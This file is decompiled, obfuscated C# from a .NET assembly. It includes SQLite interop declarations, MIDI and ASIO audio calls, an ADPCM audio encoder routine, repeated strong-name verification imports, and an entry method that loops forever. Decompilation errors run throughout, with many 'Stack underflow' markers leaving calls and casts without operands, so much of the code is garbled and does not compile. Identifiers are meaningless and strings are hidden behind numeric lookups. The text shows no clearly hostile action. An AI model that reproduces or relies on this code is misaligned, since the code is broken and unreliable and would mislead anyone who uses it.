		static bool _0001(global::_0016._0019 _0002, _001F._0015 _0003, _0019._0016 P_2)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			global::_0018._0018 obj = null;
			_ = ((_001F._0015)/*Error near IL_000a: Stack underflow*/)._0001;
			int num = ((global::_0006._0015)/*Error near IL_0014: Stack underflow*/)._0001((global::_0016._0019)/*Error near IL_0014: Stack underflow*/, P_2, out obj);
			switch (num)
			{
			case 0:
				_0098._008A_0004(obj);
				return true;
			case -2147023728:
				return false;
			default:
				global::_0007._0097(num);
				return false;
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_db_release_memory")]
		static extern _0080._0017 _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_table_cursor_interop")]
		static extern int _0001(IntPtr _0002, int _0003, int _0004);

		static _0080._0017 _0001(IntPtr _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_0020: Incompatible stack heights: 0 vs 1
			_ = null;
			_ = 1;
			_ = 1;
			_0080._0014._0001(107353921);
			_0018._0001((global::_0001._0082)/*Error near IL_0020: Stack underflow*/, (IntPtr)/*Error near IL_0020: Stack underflow*/, (byte)/*Error near IL_0020: Stack underflow*/ != 0, (byte)/*Error near IL_0020: Stack underflow*/ != 0, (string)/*Error near IL_0020: Stack underflow*/);
			return _0080._0017._0003;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_001F._0019 _0002, bool P_1)
		{
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			if (((_001F._0019)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				return;
			}
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				((_001F._0019)/*Error near IL_0015: Stack underflow*/)._0001 = null;
				if (_0002._0001 != null)
				{
					for (int i = 0; i < _0002._0001.Length; i++)
					{
						if (_0002._0001[i]._0001 != null)
						{
							_0002._0001[i]._0001._0001();
						}
					}
					_0002._0001 = null;
				}
			}
			_0002._0002 = true;
		}

		static byte[] _0001(string _0002)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			new MemoryStream();
			MemoryStream memoryStream = (MemoryStream)/*Error near IL_004a: Stack underflow*/;
			TextWriter textWriter = new StreamWriter((Stream)/*Error near IL_000c: Stack underflow*/);
			_0082_0003._007E_0015_0007(textWriter, _0002);
			global::_0008._007E_001A_0002(textWriter);
			global::_0008._007E_0001_0002(memoryStream);
			return _0088._007E_0013_0004(memoryStream);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_step")]
		static extern _0080._0017 _0001(IntPtr _0002);

		[DllImport("__Internal", BestFitMapping = false, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi, EntryPoint = "dlopen", SetLastError = true, ThrowOnUnmappableChar = true)]
		static extern IntPtr _0001(string _0002, int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static int _0001(short[] _0002, _001D._0018 _0003, byte[] _0004, int _0005, global::_0001._0017 P_4)
		{
			int result = 0;
			int num = 0;
			int num2;
			if (0 == 0)
			{
				num2 = 0;
			}
			while (num2 < _0005)
			{
				int num3;
				int i;
				if (P_4.ItuTestMode)
				{
					num3 = (num = _0002[num2++] >> 1);
				}
				else if (P_4.EncodeFrom8000Hz)
				{
					num3 = _0002[num2++] >> 1;
				}
				else
				{
					for (i = 0; i < 22; i++)
					{
						P_4.QmfSignalHistory[i] = P_4.QmfSignalHistory[i + 2];
					}
					P_4.QmfSignalHistory[22] = _0002[num2++];
					P_4.QmfSignalHistory[23] = _0002[num2++];
					int num4 = 0;
					int num5 = 0;
					for (i = 0; i < 12; i++)
					{
						num5 += P_4.QmfSignalHistory[2 * i] * _001D._0018._000F[i];
						num4 += P_4.QmfSignalHistory[2 * i + 1] * _001D._0018._000F[11 - i];
					}
					num3 = num4 + num5 >> 14;
					num = num4 - num5 >> 14;
				}
				int num6 = _0018._0001(num3 - P_4.Band[0]._0001);
				int num7 = ((num6 >= 0) ? num6 : (-(num6 + 1)));
				int num8;
				for (i = 1; i < 30; i++)
				{
					num8 = _001D._0018._0010[i] * P_4.Band[0]._0005 >> 12;
					if (num7 < num8)
					{
						break;
					}
				}
				int num9 = ((num6 < 0) ? _001D._0018._0011[i] : _001D._0018._0012[i]);
				int num10 = num9 >> 2;
				int num11 = _001D._0018._0007[num10];
				int num12 = P_4.Band[0]._0005 * num11 >> 15;
				int num13 = _001D._0018._0002[num10];
				num7 = P_4.Band[0]._0004 * 127 >> 7;
				P_4.Band[0]._0004 = num7 + _001D._0018._0001[num13];
				if (P_4.Band[0]._0004 < 0)
				{
					P_4.Band[0]._0004 = 0;
				}
				else if (P_4.Band[0]._0004 > 18432)
				{
					P_4.Band[0]._0004 = 18432;
				}
				num8 = (P_4.Band[0]._0004 >> 6) & 0x1F;
				num11 = 8 - (P_4.Band[0]._0004 >> 11);
				int num14 = ((num11 < 0) ? (_001D._0018._0003[num8] << -num11) : (_001D._0018._0003[num8] >> num11));
				P_4.Band[0]._0005 = num14 << 2;
				_0018._0001(0, P_4, num12);
				int num15;
				if (P_4.EncodeFrom8000Hz)
				{
					num15 = (0xC0 | num9) >> 8 - P_4.BitsPerSample;
				}
				else
				{
					int num16 = _0018._0001(num - P_4.Band[1]._0001);
					num7 = ((num16 >= 0) ? num16 : (-(num16 + 1)));
					num8 = 564 * P_4.Band[1]._0005 >> 12;
					int num17 = ((num7 < num8) ? 1 : 2);
					int num18 = ((num16 < 0) ? _001D._0018._0013[num17] : _001D._0018._0014[num17]);
					num11 = _001D._0018._0006[num18];
					int num19 = P_4.Band[1]._0005 * num11 >> 15;
					int num20 = _001D._0018._0005[num18];
					num7 = P_4.Band[1]._0004 * 127 >> 7;
					P_4.Band[1]._0004 = num7 + _001D._0018._0004[num20];
					if (P_4.Band[1]._0004 < 0)
					{
						P_4.Band[1]._0004 = 0;
					}
					else if (P_4.Band[1]._0004 > 22528)
					{
						P_4.Band[1]._0004 = 22528;
					}
					num8 = (P_4.Band[1]._0004 >> 6) & 0x1F;
					num11 = 10 - (P_4.Band[1]._0004 >> 11);
					num14 = ((num11 < 0) ? (_001D._0018._0003[num8] << -num11) : (_001D._0018._0003[num8] >> num11));
					P_4.Band[1]._0005 = num14 << 2;
					_0018._0001(1, P_4, num19);
					num15 = ((num18 << 6) | num9) >> 8 - P_4.BitsPerSample;
				}
				if (P_4.Packed)
				{
					P_4.OutBuffer |= (uint)(num15 << P_4.OutBits);
					P_4.OutBits += P_4.BitsPerSample;
					if (P_4.OutBits >= 8)
					{
						_0004[result++] = (byte)(P_4.OutBuffer & 0xFFu);
						P_4.OutBits -= 8;
						P_4.OutBuffer >>= 8;
					}
				}
				else
				{
					_0004[result++] = (byte)num15;
				}
			}
			return result;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static AsioError _0001(global::_0017._0015 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			/*Error near IL_0021: Stack underflow*/(pUnknown);
			return (AsioError)/*Error near IL_0016: Stack underflow*/;
		}

		static IntPtr _0001(int _0002, global::_0005._0014 P_1)
		{
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0024: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((global::_0005._0014)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0012._0011)/*Error near IL_0024: Stack underflow*/)._0001((int)/*Error near IL_0024: Stack underflow*/, out IntPtr result);
			/*Error near IL_0017: Stack underflow*/((int)/*Error near IL_0017: Stack underflow*/);
			return result;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0008._0001 _0002, string P_1)
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			//IL_00c1: Incompatible stack heights: 0 vs 4
			//IL_00cb: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0017_0005._0001_000F;
				_ = global::_0002._007E_000F;
				_ = global::_000E._007E_008A_0002;
				char[] obj = new char[1] { '>' };
				/*Error near IL_00cb: Stack underflow*/((object)/*Error near IL_00cb: Stack underflow*/, obj);
				object obj2 = ((object[])/*Error near IL_002d: Stack underflow*/)[0];
				string text = /*Error near IL_0032: Stack underflow*/(obj2);
				short num = /*Error near IL_0037: Stack underflow*/(text);
				((global::_0008._0001)/*Error near IL_003c: Stack underflow*/)._0004 = num;
				global::_0002._0001 obj3 = _0002._0001;
				int num2 = _0002._0004;
				_0002._0001 = _0018._0001(num2, obj3);
				_007F_0002._007E_0084_0005(_0002._0001, 0L);
				_0087._007E_0012_0004(_0002._0001, _0002._0001, _0086._0011_0004());
				_0018._0001(_0002, _0088._007E_0013_0004(_0002._0001), global::_0002._007E_0006(_0080._0014._0001(107353864)), false);
			}
			catch
			{
			}
		}

		static global::_0014._0017 _0001(_0014 _0002, int _0003, DbType P_2)
		{
			//IL_00eb: Incompatible stack heights: 0 vs 1
			//IL_00f1: Incompatible stack heights: 0 vs 1
			//IL_00f7: Incompatible stack heights: 0 vs 1
			if ((((_0014)/*Error near IL_000a: Stack underflow*/)._0001 & SQLiteConnectionFlags.NoVerifyTypeAffinity) == SQLiteConnectionFlags.NoVerifyTypeAffinity)
			{
				return global::_0014._0017._0008;
			}
			SQLiteConnectionFlags num = ((_0014)/*Error near IL_0031: Stack underflow*/)._0001;
			global::_0014._0017 obj = _0018._0001((_0014)/*Error near IL_0037: Stack underflow*/, num, _0003)._0001;
			switch (obj)
			{
			case global::_0014._0017._0002:
				switch (P_2)
				{
				case DbType.Int64:
					return obj;
				case DbType.Int32:
					return obj;
				case DbType.Int16:
					return obj;
				case DbType.Byte:
					return obj;
				case DbType.SByte:
					return obj;
				case DbType.Boolean:
					return obj;
				case DbType.DateTime:
					return obj;
				case DbType.Double:
					return obj;
				case DbType.Single:
					return obj;
				case DbType.Decimal:
					return obj;
				}
				break;
			case global::_0014._0017._0003:
				switch (P_2)
				{
				case DbType.Double:
					return obj;
				case DbType.Single:
					return obj;
				case DbType.Decimal:
					return obj;
				case DbType.DateTime:
					return obj;
				}
				break;
			case global::_0014._0017._0004:
				switch (P_2)
				{
				case DbType.String:
					return obj;
				case DbType.Guid:
					return obj;
				case DbType.DateTime:
					return obj;
				case DbType.Decimal:
					return obj;
				}
				break;
			case global::_0014._0017._0005:
				switch (P_2)
				{
				case DbType.Guid:
					return obj;
				case DbType.Binary:
					return obj;
				case DbType.String:
					return obj;
				}
				break;
			}
			throw new InvalidCastException();
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_value_text_interop")]
		static extern IntPtr _0001(IntPtr _0002, ref int _0003);

		static IntPtr _0001(IntPtr _0002, int _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _001C_0003._009A_0006;
			/*Error near IL_0017: Stack underflow*/((IntPtr)/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/);
			return (IntPtr)/*Error near IL_000c: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_zeroblob")]
		static extern void _0001(IntPtr _0002, int _0003);

		static string _0001(global::_0001._001A _0002, DateTime P_1)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			_ = ((global::_0001._001A)/*Error near IL_0009: Stack underflow*/)._0001;
			return global::_0001._001A._0001(_0004: ((global::_0001._001A)/*Error near IL_0010: Stack underflow*/)._0001, _0005: _0002._0005, _0002: (DateTime)/*Error near IL_001b: Stack underflow*/, _0003: (SQLiteDateFormats)/*Error near IL_001b: Stack underflow*/);
		}

		static _0016 _0001(object _0002, string _0003, global::_0007._001E P_2)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			new _0016((string)/*Error near IL_001c: Stack underflow*/, (object)/*Error near IL_001c: Stack underflow*/);
			_0016 obj = (_0016)/*Error near IL_0007: Stack underflow*/;
			P_2.Add(obj);
			return obj;
		}

		static string _0001(SortedList<string, string> _0002, string _0003, string _0004)
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006a: Incompatible stack heights: 0 vs 1
			string.IsNullOrEmpty((string?)/*Error near IL_0067: Stack underflow*/);
			if ((int)/*Error near IL_0006: Stack underflow*/ != 0)
			{
				return (string)/*Error near IL_0009: Stack underflow*/;
			}
			if (_0002.TryGetValue(_0003, out var value))
			{
				return value;
			}
			if (_0002.TryGetValue(_0003.Replace(_0080._0014._0001(107411652), string.Empty), out value))
			{
				return value;
			}
			if (_0002.TryGetValue(_0003.Replace(_0080._0014._0001(107411652), _0080._0014._0001(107353875)), out value))
			{
				return value;
			}
			return _0004;
		}

		static void _0001(string[] _0002)
		{
			_0018._0001();
			while (true)
			{
				global::_0007 obj = global::_0007._0096;
				if (8u != 0)
				{
					obj(3000);
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_blob")]
		static extern void _0001(IntPtr _0002, byte[] _0003, int _0004, IntPtr _0005);

		static bool _0001(global::_0017._007F._0008 P_0)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0008)/*Error near IL_0007: Stack underflow*/)._0018;
			int num = ((global::_0017._007F._0008)/*Error near IL_000e: Stack underflow*/)._0017;
			return (int)/*Error near IL_0010: Stack underflow*/ == num;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0005._0005 _0001(global::_0007._0013 _0002, global::_0015._0008 P_1)
		{
			//IL_00a6: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			((global::_0007._0013)/*Error near IL_00b0: Stack underflow*/)._0001(-3, out _0019._0012 _);
			MediaType mediaType = new MediaType((_0019._0012)/*Error near IL_0018: Stack underflow*/);
			_ = mediaType.MajorType;
			Guid guid = mediaType.SubType;
			int num = mediaType.ChannelCount;
			int num2 = mediaType.BitsPerSample;
			int num3 = mediaType.SampleRate;
			if (_0094_0002._0004_0006(guid, _001F._0011._000F))
			{
				return new global::_0005._0005(num3, num2, num);
			}
			if (_0094_0002._0004_0006(guid, _001F._0011._0006))
			{
				return _0018._0001(num3, num);
			}
			string text = _0018._0001(_0091._0080_0004(typeof(_001F._0011).TypeHandle), guid);
			throw new InvalidDataException(_0008_0002._0007_0005(_0080._0014._0001(107353326), text));
		}

		static void _0001(global::_0001._0081 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0001._0081)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0001._0081).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static void _0001(double _0002, global::_0017._0015 P_1)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001b: Stack underflow*/(pUnknown, _0002);
			string text = _0080._0014._0001(107353285);
			_0018._0001((global::_0017._0015)/*Error near IL_002a: Stack underflow*/, num, text);
		}

		static int _0001(bool _0002, object _0003)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = _0098._008B_0004;
				/*Error near IL_002a: Stack underflow*/((object)/*Error near IL_002a: Stack underflow*/);
				return (int)/*Error near IL_000e: Stack underflow*/;
			}
			if (_0003 == null)
			{
				return 0;
			}
			return global::_001A._007E_001B_0003(_0003);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._007F._0007._0001 _0002, int P_1)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 2
			//IL_0031: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0007._0001)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			_ = ((global::_0017._007F._0007._0001)/*Error near IL_0013: Stack underflow*/)._0002;
			int num = ((short[])/*Error near IL_0016: Stack underflow*/)[/*Error near IL_0016: Stack underflow*/] & 0xFFFF;
			byte num2 = _0002._0001[P_1];
			_0018._0001((global::_0017._007F._000E)/*Error near IL_0029: Stack underflow*/, num, (int)num2);
		}

		static void _0001(IntPtr _0002, int _0003, IntPtr _0004)
		{
			//IL_006a: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0015._0016._0001;
			/*Error near IL_0071: Stack underflow*/((object)/*Error near IL_0071: Stack underflow*/);
			bool flag;
			global::_0010._001F obj2;
			try
			{
				flag = global::_0015._0016._0001;
				obj2 = ((global::_0015._0016._0001 == null) ? null : (_0083_0003._007E_001B_0007(global::_0015._0016._0001) as global::_0010._001F));
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			if (flag)
			{
				obj2?.Invoke(null, new global::_0008._0012(_0002, _0003, _0018._0001(_0004, -1), null));
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiStreamOut")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_decltype16_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		[DllImport("winmm.dll", EntryPoint = "midiInAddBuffer")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		static _0080._0017 _0001(IntPtr _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_0020: Incompatible stack heights: 0 vs 1
			_ = null;
			_ = 1;
			_ = 1;
			_0080._0014._0001(107353921);
			_0018._0001((global::_0001._0082)/*Error near IL_0020: Stack underflow*/, (IntPtr)/*Error near IL_0020: Stack underflow*/, (byte)/*Error near IL_0020: Stack underflow*/ != 0, (byte)/*Error near IL_0020: Stack underflow*/ != 0, (string)/*Error near IL_0020: Stack underflow*/);
			return _0080._0017._0003;
		}

		static void _0001(string _0002, global::_0017._0080 P_1)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_003b: Stack underflow*/);
			}
			byte[] obj = (global::_001C._0096_0003(_0002) ? null : _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0002));
			_0018._0001((global::_0017._0080)/*Error near IL_0032: Stack underflow*/, obj);
		}

		static IEnumerable<global::_0006._000F> _0001(_0019._000E _0002, global::_0014._0008 P_1)
		{
			//IL_00bd: Incompatible stack heights: 0 vs 1
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00d1: Incompatible stack heights: 0 vs 1
			_ = ((global::_0014._0008)/*Error near IL_000a: Stack underflow*/)._0002 == IntPtr.Zero;
			if ((int)/*Error near IL_0016: Stack underflow*/ != 0)
			{
				_0080._0014._0001(107384671);
				throw new InvalidOperationException((string?)/*Error near IL_0025: Stack underflow*/);
			}
			P_1._0001 = new List<global::_0006._000F>();
			_001F._0008 obj = default(_001F._0008);
			obj._0001 = Marshal.SizeOf((object)obj);
			obj._0004 = 1024;
			obj._0001 = Marshal.AllocHGlobal(obj._0004);
			obj._0003 = (ushort)_0002._0001._0003;
			MmResult num = _0018._0001(P_1._0002, ref obj, (global::_0008._0008._0002)P_1._0001, IntPtr.Zero, _001E._000F._0001);
			Marshal.FreeHGlobal(obj._0001);
			_0018._0001(num, _0080._0014._0001(107353296));
			return P_1._0001;
		}

		unsafe static IntPtr _0001([Out] global::_0015._0012 _0002, out int _0003, ref global::_000F._000F P_2)
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 3
			//IL_0029: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((global::_0015._0012)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr result = default(IntPtr);
			_ = ref result;
			long num;
			long num2;
			int num3 = ((global::_0012._0010)/*Error near IL_001b: Stack underflow*/)._0001(out *(IntPtr*)/*Error near IL_001b: Stack underflow*/, out *(int*)/*Error near IL_001b: Stack underflow*/, out *(global::_000F._000F*)/*Error near IL_001b: Stack underflow*/, out num, out num2);
			/*Error near IL_0020: Stack underflow*/(num3);
			return result;
		}

		static string _0001()
		{
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107353275);
			_0018._0001((string)/*Error near IL_005b: Stack underflow*/, (string)null);
			string text = (string)/*Error near IL_005e: Stack underflow*/;
			if (text != null)
			{
				return text;
			}
			text = _0018._0001(global::_0017._0084._000F, (string)null);
			if (_001B_0003._0097_0006() == 4 && _0099_0003._0099_0007(text, _0080._0014._0001(107353194), StringComparison.OrdinalIgnoreCase))
			{
				text = _0080._0014._0001(107353185);
			}
			return text;
		}

		static void _0001(global::_0010._001C P_0)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_0042: Incompatible stack heights: 0 vs 1
			if (((global::_0010._001C)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_0014 obj = null;
				try
				{
					_ = _0083_0003._007E_001A_0007;
					WeakReference weakReference = ((global::_0010._001C)/*Error near IL_0018: Stack underflow*/)._0001;
					obj = /*Error near IL_001d: Stack underflow*/(weakReference) as _0014;
				}
				catch (InvalidOperationException)
				{
				}
				if (obj != null)
				{
					global::_0008._007E_001B_0002(obj);
				}
				P_0._0001 = null;
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutGetID")]
		static extern MmResult _0001(IntPtr _0002, out int _0003);

		static void _0001(_0014 P_0)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0007: Stack underflow*/)._0002 != 0)
			{
				_0080._0014._0001(107353212);
				new InvalidOperationException((string?)/*Error near IL_0023: Stack underflow*/);
				throw /*Error near IL_0013: Stack underflow*/;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static SortedList<string, string> _0001(bool _0002, string _0003, bool _0004)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 2
			_ = null;
			return _0018._0001((string)/*Error near IL_000c: Stack underflow*/, (byte)/*Error near IL_000c: Stack underflow*/ != 0, (global::_0017._0080)/*Error near IL_000c: Stack underflow*/, (byte)/*Error near IL_000c: Stack underflow*/ != 0);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_0014 P_0)
		{
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007f: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				if (((_0014)/*Error near IL_0011: Stack underflow*/)._0001 == null)
				{
					_0080._0014._0001(107353159);
					throw new InvalidOperationException((string?)/*Error near IL_001f: Stack underflow*/);
				}
				if (P_0._0006 == 0)
				{
					throw new SQLiteException(_0080._0014._0001(107353122));
				}
				global::_0017._0080 obj = P_0._0001.Connection;
				if (obj._0017 != P_0._0006 || _000F_0006._007E_009D_000F(obj) != ConnectionState.Open)
				{
					throw new InvalidOperationException(_0080._0014._0001(107353109));
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_blob_close")]
		static extern _0080._0017 _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_enable_shared_cache")]
		static extern _0080._0017 _0001(int _0002);

		static int _0001(_0019._0010 _0002, byte[] _0003, int _0004, int P_3)
		{
			//IL_00f2: Incompatible stack heights: 0 vs 1
			//IL_00fe: Incompatible stack heights: 0 vs 2
			object obj = ((_0019._0010)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				int num = 0;
				if (P_3 > _0002._0001.Length - _0002._0003)
				{
					P_3 = _0002._0001.Length - _0002._0003;
				}
				int num2 = _0016_0002._0018_0005(_0002._0001.Length - _0002._0001, P_3);
				_0099_0002._0010_0006(_0003, _0004, _0002._0001, _0002._0001, num2);
				_0002._0001 += num2;
				_0002._0001 %= _0002._0001.Length;
				num += num2;
				if (num < P_3)
				{
					_0099_0002._0010_0006(_0003, _0004 + num, _0002._0001, _0002._0001, P_3 - num);
					_0002._0001 += P_3 - num;
					num = P_3;
				}
				_0002._0003 += num;
				return num;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		unsafe static bool _0001(ref global::_0012._0014 _0002, [Out] _0019._007F _0003)
		{
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				*(@null*)(nint)/*Error near IL_0008: Stack underflow*/ = null;
				return false;
			}
			if ((object)((_0019._007F)/*Error near IL_0011: Stack underflow*/)._0001 != null || (object)_0003._0002 != null)
			{
				_0002 = new global::_0006._0019(_0003._0001, _0003._0002);
				return true;
			}
			if ((object)_0003._0001 != null)
			{
				_0002 = (global::_0012._0014)_0010_0006._009E_000F(_0003._0001);
				return true;
			}
			_0002 = null;
			return false;
		}

		static object _0001(IntPtr _0002)
		{
			//IL_005f: Incompatible stack heights: 0 vs 1
